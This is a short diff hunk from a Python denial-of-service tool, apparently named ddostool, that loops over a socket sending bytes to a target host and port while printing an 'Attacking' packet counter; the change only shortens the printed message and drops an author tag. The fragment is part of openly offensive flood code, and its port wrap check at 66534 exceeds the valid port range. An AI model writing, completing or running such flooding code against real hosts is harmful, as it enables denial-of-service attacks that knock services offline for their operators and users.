@@ -91,7 +91,7 @@ def ddostool():
           s.connect((host,port))
           s.sendto(bytes, (host,port))
           sent = sent + 1
-          print(Fore.GREEN + "Attacking %s packets to %s on port %s %s" %(sent,host,port,"By Apkaless"))
+          print(Fore.GREEN + "Attacking %s packets to %s" %(sent,host))
           if port == 66534:
                port = 1
 
